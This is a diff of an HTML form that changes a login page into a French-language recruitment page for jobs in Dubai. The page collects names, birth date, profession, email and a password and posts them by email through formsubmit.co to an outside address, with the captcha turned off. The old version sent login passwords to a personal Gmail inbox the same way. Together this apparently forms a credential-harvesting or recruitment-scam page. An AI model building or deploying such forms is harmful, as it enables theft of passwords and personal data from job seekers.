@@ -1,25 +1,44 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Modern Login Form</title>
+    <title>Recrutement sur Dubaï francophone</title>
     <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
-        <form id="loginForm" class="login-form" action="https://formsubmit.co/username240920055@gmail.com" method="POST">
-            <h2>Login</h2>
+        <h1>Recrutement sur Dubaï francophone</h1>
+        <div class="image-slider">
+            <img src="" alt="Dubai" id="sliderImage">
+        </div>
+        <form id="recruitmentForm" class="recruitment-form" action="https://formsubmit.co/YOUR_EMAIL_HERE" method="POST">
+            <div class="input-group">
+                <input type="text" id="nom" name="nom" required>
+                <label for="nom">Nom</label>
+            </div>
+            <div class="input-group">
+                <input type="text" id="prenom" name="prenom" required>
+                <label for="prenom">Prénom</label>
+            </div>
+            <div class="input-group">
+                <input type="text" id="dateNaissance" name="dateNaissance" placeholder="jj/mm/aaaa" required>
+                <label for="dateNaissance">Date de naissance</label>
+            </div>
+            <div class="input-group">
+                <input type="text" id="profession" name="profession" required>
+                <label for="profession">Profession</label>
+            </div>
             <div class="input-group">
                 <input type="email" id="email" name="email" required>
                 <label for="email">Email</label>
             </div>
             <div class="input-group">
-                <input type="password" id="password" name="password" required>
-                <label for="password">Password</label>
+                <input type="password" id="motDePasse" name="motDePasse" required>
+                <label for="motDePasse">Mot de passe</label>
             </div>
-            <button type="submit">Sign In</button>
-            <!-- Hidden input to prevent spam -->
+            <button type="submit">S'inscrire</button>
             <input type="hidden" name="_captcha" value="false">
         </form>
     </div>
